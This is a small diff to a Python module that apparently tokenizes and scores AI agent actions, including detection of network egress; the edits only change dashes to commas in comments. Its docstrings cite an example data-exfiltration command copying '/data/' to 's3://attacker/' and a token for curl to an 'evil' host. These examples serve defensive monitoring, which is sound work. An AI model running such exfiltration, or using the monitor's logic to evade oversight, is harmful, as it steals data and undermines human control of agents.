@@ -75,7 +75,7 @@ class Trajectory:
 
 
 # --------------------------------------------------------------------------- #
-# Tokenization — the shared symbol space for every scorer and the envelope.
+# Tokenization, the shared symbol space for every scorer and the envelope.
 # --------------------------------------------------------------------------- #
 _RESOURCE_SPLIT = (":", "/", ".")
 
@@ -143,7 +143,7 @@ def command_head(action: Action) -> str:
 def egress_hint_from_command(command: str, head: str) -> str:
     """Object-store / URL destination for a network CLI, else empty.
 
-    Only when ``head`` is a real network/cloud binary — never for ``sed``/``awk``
+    Only when ``head`` is a real network/cloud binary, never for ``sed``/``awk``
     that merely mention a URL inside a rewrite script.
     """
     import re
@@ -171,7 +171,7 @@ def path_hint(action: Action) -> str:
     """Filesystem / egress target (meta, args, or cloud-CLI destination).
 
     For Bash cloud CLIs, prefers ``s3://`` / ``gs://`` / URL destinations over a
-    local source path the loader may have recorded alone — otherwise weight
+    local source path the loader may have recorded alone, otherwise weight
     exfil via ``aws s3 cp /data/... s3://attacker/`` looks in-surface.
     """
     head = command_head(action)
@@ -206,7 +206,7 @@ def surface_token(action: Action) -> str:
 
 
 def fine_action_token(action: Action) -> str:
-    """``verb|tool|cmd_head|surface`` — finer than ``action_token`` for twin corridors.
+    """``verb|tool|cmd_head|surface``, finer than ``action_token`` for twin corridors.
 
     Still metadata-only (no free-text body). Distinguishes ``Bash|curl|net:evil``
     from ``Bash|ls|py`` where the coarse token collapses both to ``execute|Bash|workspace``.
